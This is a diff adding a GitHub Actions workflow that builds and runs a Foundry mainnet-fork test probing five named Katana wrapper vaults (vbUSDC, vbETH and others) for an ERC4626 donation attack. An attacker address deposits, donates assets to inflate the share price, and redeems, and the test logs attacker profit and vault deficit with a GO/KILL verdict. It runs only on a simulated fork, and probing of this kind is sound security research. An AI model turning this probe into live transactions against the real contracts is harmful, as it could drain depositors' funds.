@@ -1,0 +1,224 @@
+name: Katana ERC4626 donation-capture exact-fork gate
+
+on:
+  pull_request:
+    branches: [main]
+    paths:
+      - '.github/workflows/katana-erc4626-donation-capture-fork-20260729.yml'
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  gate:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 40
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          persist-credentials: false
+          fetch-depth: 1
+
+      - uses: foundry-rs/foundry-toolchain@v1
+        with:
+          version: stable
+
+      - name: Build exact-fork adversarial ERC4626 test
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf gate
+          mkdir -p gate/test
+          cd gate
+          forge install foundry-rs/forge-std@v1.9.4 --no-git --shallow
+          cat > foundry.toml <<'EOF'
+          [profile.default]
+          test = "test"
+          libs = ["lib"]
+          solc_version = "0.8.29"
+          evm_version = "cancun"
+          optimizer = true
+          optimizer_runs = 833
+          gas_limit = 2000000000
+          EOF
+          cat > test/DonationCapture.t.sol <<'SOL'
+          // SPDX-License-Identifier: MIT
+          pragma solidity 0.8.29;
+
+          import {Test, console2} from "forge-std/Test.sol";
+
+          interface IERC20Like {
+              function balanceOf(address) external view returns (uint256);
+              function approve(address,uint256) external returns (bool);
+              function transfer(address,uint256) external returns (bool);
+          }
+
+          interface IERC4626Like {
+              function asset() external view returns (address);
+              function balanceOf(address) external view returns (uint256);
+              function deposit(uint256,address) external returns (uint256);
+              function redeem(uint256,address,address) external returns (uint256);
+              function totalAssets() external view returns (uint256);
+              function totalSupply() external view returns (uint256);
+              function convertToAssets(uint256) external view returns (uint256);
+          }
+
+          interface IVbTokenLike {
+              function asset() external view returns (address);
+              function yieldVault() external view returns (address);
+              function deposit(uint256,address) external returns (uint256);
+              function redeem(uint256,address,address) external returns (uint256);
+              function totalAssets() external view returns (uint256);
+              function totalSupply() external view returns (uint256);
+              function backingDifference() external view returns (bool,uint256);
+          }
+
+          contract DonationCapture is Test {
+              address constant ATTACKER = address(0xA7711A);
+              address[5] VBS = [
+                  0x53E82ABbb12638F09d9e624578ccB666217a765e,
+                  0x2DC70fb75b88d2eB4715bc06E1595E6D97c34DFF,
+                  0x2C24B57e2CCd1f273045Af6A5f632504C432374F,
+                  0x6d4f9f9f8f0155509ecd6Ac6c544fF27999845CC,
+                  0x3DD459dE96F9C28e3a343b831cbDC2B93c8C4855
+              ];
+              string[5] LABELS = ["vbUSDC","vbETH","vbWBTC","vbUSDT","vbUSDS"];
+
+              function setUp() public { vm.createSelectFork(vm.envString("ETH_RPC_URL")); }
+
+              function test_DonationCaptureMatrix() public {
+                  uint256[6] memory ratios = [uint256(1),10,100,1000,10_000,100_000];
+                  for (uint256 t; t < VBS.length; ++t) {
+                      IVbTokenLike vb = IVbTokenLike(VBS[t]);
+                      IERC20Like asset = IERC20Like(vb.asset());
+                      uint256 unit = 10 ** _decimals(address(asset));
+                      uint256[5] memory deposits = [uint256(1),10,100,1_000,10_000];
+                      for (uint256 r; r < ratios.length; ++r) {
+                          for (uint256 a; a < deposits.length; ++a) {
+                              uint256 snap = vm.snapshotState();
+                              _scenario(LABELS[t], VBS[t], unit, ratios[r], deposits[a], false);
+                              vm.revertToState(snap);
+                              snap = vm.snapshotState();
+                              _scenario(LABELS[t], VBS[t], unit, ratios[r], deposits[a], true);
+                              vm.revertToState(snap);
+                          }
+                      }
+                  }
+              }
+
+              function _scenario(
+                  string memory label,
+                  address vbAddress,
+                  uint256 unit,
+                  uint256 donationRatio,
+                  uint256 vbDepositUnits,
+                  bool redeemVbFirst
+              ) internal {
+                  IVbTokenLike vb = IVbTokenLike(vbAddress);
+                  IERC20Like asset = IERC20Like(vb.asset());
+                  IERC4626Like ext = IERC4626Like(vb.yieldVault());
+
+                  uint256 seed = unit;
+                  uint256 donation = unit * donationRatio;
+                  uint256 vbDepositAmount = unit * vbDepositUnits;
+                  uint256 initial = seed + donation + vbDepositAmount;
+                  deal(address(asset), ATTACKER, initial, true);
+
+                  (bool beforePositive,uint256 beforeDiff)=vb.backingDifference();
+                  uint256 vbAssetsBefore=vb.totalAssets();
+                  uint256 vbSupplyBefore=vb.totalSupply();
+
+                  vm.startPrank(ATTACKER);
+                  asset.approve(address(ext), type(uint256).max);
+                  uint256 directShares;
+                  try ext.deposit(seed, ATTACKER) returns (uint256 s) { directShares=s; }
+                  catch { vm.stopPrank(); return; }
+
+                  // Permissionless raw-asset donation changes external share price without minting shares.
+                  asset.transfer(address(ext), donation);
+
+                  asset.approve(vbAddress, type(uint256).max);
+                  uint256 mintedVb;
+                  bool vbDepositOk;
+                  try vb.deposit(vbDepositAmount, ATTACKER) returns (uint256 s) {
+                      mintedVb=s; vbDepositOk=true;
+                  } catch {}
+
+                  uint256 directRedeemed;
+                  uint256 vbRedeemed;
+                  if (vbDepositOk) {
+                      if (redeemVbFirst) {
+                          try vb.redeem(mintedVb, ATTACKER, ATTACKER) returns (uint256 x) { vbRedeemed=x; } catch {}
+                          try ext.redeem(directShares, ATTACKER, ATTACKER) returns (uint256 x) { directRedeemed=x; } catch {}
+                      } else {
+                          try ext.redeem(directShares, ATTACKER, ATTACKER) returns (uint256 x) { directRedeemed=x; } catch {}
+                          try vb.redeem(mintedVb, ATTACKER, ATTACKER) returns (uint256 x) { vbRedeemed=x; } catch {}
+                      }
+                  } else {
+                      try ext.redeem(directShares, ATTACKER, ATTACKER) returns (uint256 x) { directRedeemed=x; } catch {}
+                  }
+                  vm.stopPrank();
+
+                  uint256 finalBalance=asset.balanceOf(ATTACKER);
+                  (bool afterPositive,uint256 afterDiff)=vb.backingDifference();
+                  uint256 deficitBefore=beforePositive ? 0 : beforeDiff;
+                  uint256 deficitAfter=afterPositive ? 0 : afterDiff;
+                  uint256 deficitIncrease=deficitAfter>deficitBefore ? deficitAfter-deficitBefore : 0;
+                  uint256 profit=finalBalance>initial ? finalBalance-initial : 0;
+
+                  if (profit>0 || deficitIncrease>0) {
+                      console2.log("CANDIDATE_TOKEN",label);
+                      console2.log("DONATION_RATIO",donationRatio);
+                      console2.log("VB_DEPOSIT_UNITS",vbDepositUnits);
+                      console2.log("REDEEM_VB_FIRST",redeemVbFirst ? uint256(1):uint256(0));
+                      console2.log("VB_DEPOSIT_OK",vbDepositOk ? uint256(1):uint256(0));
+                      console2.log("DIRECT_SHARES",directShares);
+                      console2.log("DIRECT_REDEEMED",directRedeemed);
+                      console2.log("VB_REDEEMED",vbRedeemed);
+                      console2.log("INITIAL",initial);
+                      console2.log("FINAL",finalBalance);
+                      console2.log("ATTACKER_PROFIT",profit);
+                      console2.log("DEFICIT_INCREASE",deficitIncrease);
+                      console2.log("VB_ASSETS_BEFORE",vbAssetsBefore);
+                      console2.log("VB_ASSETS_AFTER",vb.totalAssets());
+                      console2.log("VB_SUPPLY_BEFORE",vbSupplyBefore);
+                      console2.log("VB_SUPPLY_AFTER",vb.totalSupply());
+                  }
+              }
+
+              function _decimals(address token) internal view returns (uint8 d) {
+                  (bool ok,bytes memory data)=token.staticcall(abi.encodeWithSignature("decimals()"));
+                  require(ok && data.length>=32);
+                  d=abi.decode(data,(uint8));
+              }
+          }
+          SOL
+
+      - name: Run fork matrix
+        shell: bash
+        env:
+          ETH_RPC_URL: https://ethereum-rpc.publicnode.com
+        run: |
+          set -o pipefail
+          mkdir -p evidence
+          cd gate
+          forge test --match-test test_DonationCaptureMatrix -vvvv 2>&1 | tee ../evidence/FOUNDRY.log
+          status=${PIPESTATUS[0]}
+          cd ..
+          grep -E 'CANDIDATE_|ATTACKER_PROFIT|DEFICIT_INCREASE|DONATION_RATIO|VB_DEPOSIT|REDEEM_VB_FIRST|Suite result' evidence/FOUNDRY.log > evidence/CANDIDATES.txt || true
+          if grep -Eq 'ATTACKER_PROFIT [1-9]|DEFICIT_INCREASE [1-9]' evidence/CANDIDATES.txt; then echo GO > evidence/VERDICT.txt; else echo KILL > evidence/VERDICT.txt; fi
+          printf '%s\n' "$status" > evidence/FORGE_EXIT_CODE.txt
+          sha256sum evidence/* > evidence/SHA256SUMS
+          cat evidence/VERDICT.txt
+          cat evidence/CANDIDATES.txt
+          exit "$status"
+
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: katana-erc4626-donation-capture-${{ github.run_id }}
+          path: evidence/
+          if-no-files-found: warn
+          retention-days: 1
+          compression-level: 9
